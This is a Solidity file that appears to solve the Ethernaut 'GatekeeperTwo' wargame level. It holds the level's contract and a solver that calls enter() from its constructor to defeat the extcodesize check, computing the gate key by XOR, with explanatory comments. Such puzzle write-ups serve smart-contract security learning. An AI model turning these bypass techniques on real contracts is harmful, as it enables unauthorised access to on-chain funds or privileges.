// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperTwo {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        uint x;
        assembly {
            x := extcodesize(caller())
        } // will be passed in the constructor function so as to pass because contract is basically an address without code during initialization
        // (is an edge case in dealing with this sort of scenario)
        require(x == 0);
        _;
    }

    // ^ = XOR (Exclusive OR), only one value has to be true not both
    // A ^ B = C
    // A ^ C = B
    // bytes8((uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ type(uint64).max)) == bytes8(uint64(_gateKey)) // this is how we will get the key
    modifier gateThree(bytes8 _gateKey) {
        require(
            uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^
                uint64(_gateKey) ==
                type(uint64).max
        );
        _;
    }

    function enter(
        bytes8 _gateKey
    ) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}

contract Test {
    constructor() {
        GatekeeperTwo gatekeeperContract = GatekeeperTwo(
            0x8FAb62b4115eF0eB122259CE3c3Ff0d38e8fb089
        );

        bytes8 gateKey = bytes8(
            (uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^
                type(uint64).max)
        );

        gatekeeperContract.enter(gateKey);
    }
}
